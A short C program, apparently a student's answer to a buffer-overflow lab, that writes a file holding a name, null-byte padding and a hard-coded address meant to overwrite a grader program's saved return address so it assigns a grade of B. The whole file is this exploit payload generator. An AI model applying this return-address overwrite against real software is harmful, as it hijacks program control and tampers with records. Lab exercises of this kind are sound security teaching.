/* Produces a file called dataB with the student name, a nullbyte,
   padding to overrun the stack, and the address of the instruction in
   main to get a B, the latter of which will overwrite getName's stored
   x30. */
#include <stdio.h>

/* Prints a buffer overun string to the file dataB that causes the
grader to give a grade B to the name Ibraheem Amin */
int main()
{
    FILE *psFile;
    int i;
    unsigned long ulData = 0x400890;
    psFile = fopen("dataB", "w");

    /* Name */
    fprintf(psFile, "%s", "Ibraheem Amin");
    /* Nullbyte at the end of the name */
    putc(0, psFile);
    /* Filler nullbyte*/
    for (i = 0; i < 34; i++)
    {
        putc(0, psFile);
    }
    /* address in text where B is assigned to grade */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}